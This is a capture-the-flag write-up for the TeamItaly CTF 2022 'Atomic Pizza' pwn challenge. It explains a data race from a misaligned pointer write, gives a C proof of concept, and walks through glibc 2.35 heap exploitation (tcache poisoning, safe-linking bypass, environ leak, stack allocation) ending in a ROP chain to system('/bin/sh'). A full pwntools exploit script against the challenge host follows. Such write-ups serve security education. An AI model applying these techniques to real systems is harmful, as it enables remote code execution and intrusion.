# TeamItaly CTF 2022

## Atomic Pizza (1 solves)

I found this pizzeria where they let you create your own toppings,
you should try it.

## Solution

### TL;DR

- In `select_favorite_slice` you can get `favorite_slice` to point
  to an arbitrary location abusing the non atomicity of the `mov`
  instruction on non naturally aligned addresses (the stripped
  global variable)
- Leak heap from tcache bin and libc from unsorted bin
- Get an arbitrary allocation right above `environ` and leak it,
  using again the first vulnerability
- Get another arbitrary allocation in the stack and ROP to the win

### Overview

The binary is a simple application that lets you create a pizza:
you can create / modify / eat (delete) / look at slices.
There is an option to select your favorite slice, but it just randomly
select a slice and once selected, you can look at it and modify it.

The reversing part is a bit tricky if you use the wrong decompiler:
because the `assert_fail` function takes a vararg, some decompilers
don't understand what's happening and thinks that that function will
never return, thus truncating the functions calling it. I found out
that Ghidra and Ida 7.5 works really bad, while Binary ninja and
Ida 7.7 works fine, with Ida 7.7 getting an almost source code match.

The "normal slice" 's functions looks fine, they handle the slices
with exaustive checks and a bit of trolling if you do something
wrong (such as asking for a too big topping or answering neither 'y'
nor 'n' to a 'y/n' question). The `select_favorite_slice` function
can be called only with more than two already existing slices. Inside
a secondary thread it creates an array with only the non-NULL slices
and start looping throught those slices. When, in the main thread,
the user tells to "stop spinning the pizza", the `favortie_slice`
gets extracted and the secondary thread gets stopped. The functions
to handle the `favorite_slice` also look fine, also because they are
pretty much identical to the normal ones.

### Vulnerability

The vulnerability is a data race in the `select_favorite_slice`
and `pizza_spinner` functions. There are two global variables: the
first one is stripped and keeps getting changed in a while loop over
the existing slices, while the second one, `favorite_slice`, is
assigned to the first one while the first one is still "spinning".
The problem is that the stripped variable is located at `0x...f`,
so it is not naturally aligned, in particular, the first byte of
the pointer is in one `QWORD` and the other 7 bytes in the
successive one. This makes the `mov` instruction on that address, non
atomic and if it happens that the two `QWORD`s crosses a cache-line,
you would have enough time to read a half assigned value (I'm not
entirely sure if this is the correct reason, but I did some
research and it looks reasonable enough).

A simple POC would be something like this:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>

#pragma pack(1)  // Otherwise the compiler would add one byte of padding after `pad`
struct foo {
    char pad[7];
    __uint64_t val;  // This is at 0x...f
} shared;

void* shuffle(void* args) {
    __uint8_t turn = 0;
    while (1) {
        if (turn) shared.val = 0x4141414141414141ULL;
        else      shared.val = 0x4242424242424242ULL;
        turn ^= 1;
    }
    return NULL;
}

int main () {
    pthread_t th;
    shared.val = 0x4141414141414141ULL;
    size_t attempts = 0;

    pthread_create(&th, NULL, shuffle, NULL);
    while (1) {
        attempts++;
        usleep(1000);
        // With usleep it takes less than 1000 attempts, without it, about 1000000
        // I guess this happens because it leaves some time for the caches to cool down
        __uint64_t extracted = shared.val;
        if (extracted != 0x4141414141414141ULL && extracted != 0x4242424242424242ULL) {
            printf("Taken %ld attempts\n", attempts);
            printf("%#018lx\n", extracted);
            break;
        }
    }

    pthread_cancel(th);
    return 0;
}

// $ gcc -o poc -pthread poc.c
// $ ./poc
// Taken 127 attempts
// 0x4141414141414142
```

### Exploitation strategy

Using this vulnerability we can get `favorite_slice` to point to an
(almost) arbitrary location. The first allocated chunk will be at
`0x2a0`, so we can create another chunk at `0x.b0` and get
`favorite slice` to point inside the first slice's topping at `0x2b0`.
From there we can set its size to whatever we want, in order to leak
freed chunks and overwrite their pointers.

Since libc is 2.35 we can't just leak libc and overwrite `__free_hook`,
but we need to do a little more work.

First we leak heap address from two tcache chunks (two because of
safe linking) and libc address from a unsorted bin chunk.
Then we leak the stack from `environ`, inside libc, by getting
an arbitrary allocation above it and abusing the vulnerability
again. Now we only need one last arbitrary allocation inside
the stack and we can do ROP to get RCE. For this we could use
the race once again, but it is easier to set up an arbitrary
allocation with the first fake `favorite_slice` and use it to get
overlapping chunks.

### Exploit

For each arbitrary allocation we need two chunks: one to overwrite the
tcache forward pointer and another one to increment the tcache entry
counter otherwise the corrupted pointer would be ignored. So, for the
first part we need a total of 7 slices:

- the first and last will have the right addresses to perform the
  data race
- the second and third are for one arbitrary allocation
- the fourth and fifth for the second one
- the sixth is a big slice that will go in the unsorted bins
  and leak the libc

```python
fake_slice1 = p16(0x1000) + b"CHECK"
create_slice(1, b"A" * (0x10 - 2) + fake_slice, 0x18 - 3) # 0x20 chunk
create_slice(2, b"AAAA", 0x28 - 3) # 0x30 chunk
create_slice(3, b"AAAA", 0x28 - 3)
create_slice(4, b"AAAA", 0x38 - 3) # 0x40 chunk
create_slice(5, b"AAAA", 0x38 - 3)
create_slice(6, b"AAAA", 0x500 - 3)
create_slice(7, b"AAAA", 0x18 - 3)
```

The first slice is located at `0x2a0` and the last one at `0x8b0`, so
the possible fake slices are `0x8a0`, that is empty (`size = 0`)
because I've written nothing at that address, and `0x2b0` that points
right to the fake_slice. Now we delete every chunk exept the first one
and the last one and call `select_favorite_slice` until
`favorite_slice` starts with the string `"CHECK"`.

```python
eat_slice(2)
eat_slice(3)
eat_slice(4)
eat_slice(5)
eat_slice(6)
leak = b""
while not leak.startswith(b"CHECK"):
    leak = spin_pizza()
```

The libc leak is in the 6th slice, while for the heap leak we need
to undo the safe linking of the forward pointers of slices 2 and 3:
`heap_leak = forward_pointer2 ^ forward_pointer3`.

Now we have to set up the two arbitrary allocations. For the slice
above `environ` we overwrite the 3rd slice's forward pointer,
while for the heleper slice to get the overlapping chunks and,
in the future, an arbitrary allocation into the stack, we use
the 5th slice.

```python
fake_slice1 = heap_base + 0x2b0
chunk3 = heap_base + 0x2f0
chunk5 = heap_base + 0x360

future_arbitrary_alloc = heap_base + 0x510
target_allocation = libc.symbols["environ"] - 0x30

payload  = b"A" * (chunk3 - fake_slice1 - 0x8 - 2)
payload += p64(0x31)  # Chunk size
payload += p64((chunk3 >> 12) ^ target_allocation)  # Target allocation with safe linking
payload  = payload.ljust(chunk5 - fake_slice1 - 0x8 - 2, b"A")
payload += p64(0x41)
payload += p64((chunk5 >> 12) ^ future_arbitrary_alloc)
edit_favorite_slice(payload, 0x1000 - 1)
```

The second allocation on the `0x30` chunks will be at `environ - 0x30`.
The `- 0x30` is important because of two reasons: everything in the
allocated slice will be memset to 0, so we must be far enugh and
the first allocation on the `0x30` chunks will be at `0x.f0`,
while `environ` is at `0x.00`, hence, `environ - 0x30` will be at
`0x.d0` and we will craft the fake slice at `0x.f0 = environ - 0x10`

```python
create_slice(2, b"AAAA", 0x28 - 3)
fake_slice2 = p16(0x20) + b"CHECK"
create_slice(3, b"A" * (0x20 - 2) + fake_slice2, 0x28 - 3)
```

We delete the (now) useless slices and exploit the vulnerability
again to get the stack leak.

```python
eat_slice(1)
eat_slice(7)
leak = b""
while not leak.startswith(b"CHECK"):
    leak = spin_pizza()
```

Now we have a stack leak, so we just use the helper slice to get
another arbitrary allocation. We create and free 2 slices in the
`0x60` bin, then we allocate two slices of size `0x40` (the size
of the helper slice) and the second one will be an overlapping
slice, so we can use it to overwrite the `0x60` chunk forward
pointer.

```python
create_slice(4, b"AAAA", 0x58 - 3)
create_slice(5, b"AAAA", 0x58 - 3)
eat_slice(4)
eat_slice(5)
create_slice(4, b"AAAA", 0x38 - 3)

chunk5 = heap_base + 0x520
stack_allocation = environ - 0x120 - 0x8
payload  = b"A" * 0x6
payload += p64(0x61)  # Chunk size
payload += p64((chunk5 >> 12) ^ stack_allocation)
create_slice(5, payload, 0x38 - 3)
```

Finally the second allocation of size `0x60` will be into the stack
and we can do ROP to exectue `system("/bin/sh")`. We target the
`main` return address, so the payload will be triggere once we exit.

```python
create_slice(6, b"AAAA", 0x58 - 3)
rop  = b"A" * 0x6
rop += p64(POP_RDI + libc_base)
rop += p64(next(libc.search(b"/bin/sh\x00")))
rop += p64(RET + libc_base)  # system requires the stack to be aligned at 0x10
rop += p64(libc.symbols["system"])
create_slice(7, rop, 0x58 - 3)

r.recvuntil(b"> ")  # Exit
r.sendline(b"8")
```

### Exploit script

```python

#!/usr/bin/python3

import os
from pwn import *

HOST = os.environ.get("HOST", "atomic-pizza.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15010))

context(arch="amd64", log_level="warning")

for i in range(3):  # Otherwise, it will fail if a \n appears in the addresses

    r = connect(HOST, PORT)

    POP_RDI = 0x2a3e5
    RET = 0x29cd6

    def create_slice(index, topping, size):
        r.recvuntil(b"> ")
        r.sendline(b"1")
        r.recvuntil(b"> ")
        r.sendline(b"%d" % size)
        r.recvuntil(b"> ")

        if size == len(topping):
            r.send(topping)
        else:
            r.sendline(topping)

        r.recvuntil(b"> ")
        r.sendline(b"%d" % index)

    def eat_slice(index):
        r.recvuntil(b"> ")
        r.sendline(b"4")
        r.recvuntil(b"> ")
        r.sendline(b"%d" % index)
        r.recvuntil(b"> ")
        r.sendline(b"y")

    def spin_pizza():
        r.recvuntil(b"> ")
        r.sendline(b"5")
        r.recvuntil(b"> ")
        r.sendline(b"")
        r.recvuntil(b"> ")
        r.sendline(b"")

        r.recvuntil(b"> ")
        result = r.recvuntil(b"\n----")[:-5]
        return result

    def edit_favorite_slice(new_topping, size):
        r.recvuntil(b"> ")
        r.sendline(b"7")
        r.recvuntil(b"> ")
        r.sendline(b"%d" % size)
        r.recvuntil(b"> ")
        r.sendline(new_topping)

    try:
        fake_slice1 = p16(0x1000) + b"CHECK"
        create_slice(1, b"A" * (0x10 - 2) + fake_slice1, 0x18 - 3)
        create_slice(2, b"AAAA", 0x28 - 3)
        create_slice(3, b"AAAA", 0x28 - 3)
        create_slice(4, b"AAAA", 0x38 - 3)
        create_slice(5, b"AAAA", 0x38 - 3)
        create_slice(6, b"AAAA", 0x500 - 3)
        create_slice(7, b"AAAA", 0x18 - 3)

        eat_slice(2)
        eat_slice(3)
        eat_slice(4)
        eat_slice(5)
        eat_slice(6)

        leak = b""
        while not leak.startswith(b"CHECK"):
            leak = spin_pizza()

        next1 = u64(leak[0x10 - 2: 0x18 - 2])
        next2 = u64(leak[0x40 - 2: 0x48 - 2])
        heap_base = (next1 ^ next2) - 0x2c0
        libc_leak = u64(leak[0x210 - 2: 0x218 - 2])
        libc_base = libc_leak - 0x219ce0

        fake_slice1 = heap_base + 0x2b0
        chunk3 = heap_base + 0x2f0
        chunk5 = heap_base + 0x360
        future_arbitrary_alloc = heap_base + 0x510
        target_allocation = 0x221200 - 0x30 + libc_base
        payload = b"A" * (chunk3 - fake_slice1 - 0x8 - 2)
        payload += p64(0x31)  # Chunk size
        payload += p64((chunk3 >> 12) ^ target_allocation)
        payload = payload.ljust(chunk5 - fake_slice1 - 0x8 - 2, b"A")
        payload += p64(0x41)
        payload += p64((chunk5 >> 12) ^ future_arbitrary_alloc)
        edit_favorite_slice(payload, 0x1000 - 1)

        create_slice(2, b"AAAA", 0x28 - 3)
        fake_slice2 = p16(0x20) + b"CHECK"
        create_slice(3, b"A" * (0x20 - 2) + fake_slice2, 0x28 - 3)
        eat_slice(1)
        eat_slice(7)

        leak = b""
        while not leak.startswith(b"CHECK"):
            leak = spin_pizza()

        environ = u64(leak[0x10 - 2: 0x18 - 2])

        create_slice(4, b"AAAA", 0x58 - 3)
        create_slice(5, b"AAAA", 0x58 - 3)

        eat_slice(4)
        eat_slice(5)

        create_slice(4, b"AAAA", 0x38 - 3)

        chunk5 = heap_base + 0x520
        stack_allocation = environ - 0x120 - 0x8
        payload = b"A" * 0x6
        payload += p64(0x61)  # Chunk size
        payload += p64((chunk5 >> 12) ^ stack_allocation)
        create_slice(5, payload, 0x38 - 3)

        create_slice(6, b"AAAA", 0x58 - 3)

        rop = b"A" * 0x6
        rop += p64(POP_RDI + libc_base)
        rop += p64(0x1d8698 + libc_base)
        rop += p64(RET + libc_base)
        rop += p64(0x50d60 + libc_base)
        create_slice(7, rop, 0x58 - 3)

        r.recvuntil(b"> ")
        r.sendline(b"8")

        r.recvuntil(b"Bye! :D\n")
        r.sendline(b"cat pizza_secret.txt")
        print(r.recvline().strip().decode())
        r.close()
        break
    except:
        r.close()

else:
    print("Service is down")
```
